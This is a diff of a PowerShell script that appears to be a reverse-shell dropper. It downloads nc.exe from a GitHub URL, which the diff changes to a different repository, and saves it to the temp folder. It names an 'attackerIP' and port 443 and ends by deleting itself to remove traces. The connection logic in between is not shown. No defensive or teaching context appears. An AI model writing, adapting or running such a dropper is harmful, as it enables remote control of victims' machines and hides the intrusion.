@@ -1,7 +1,7 @@
 [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
 
 # Stable nc.exe (x86)
-$ncUrl      = "https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nc.exe"
+$ncUrl      = "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe"
 $ncPath     = "$env:TEMP\nc.exe"
 $attackerIP = "192.168.1.104"
 $port       = "443"
@@ -21,3 +21,4 @@ if (Test-Path $ncPath) {
 # Delete
 Start-Sleep -Seconds 2
 Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
+
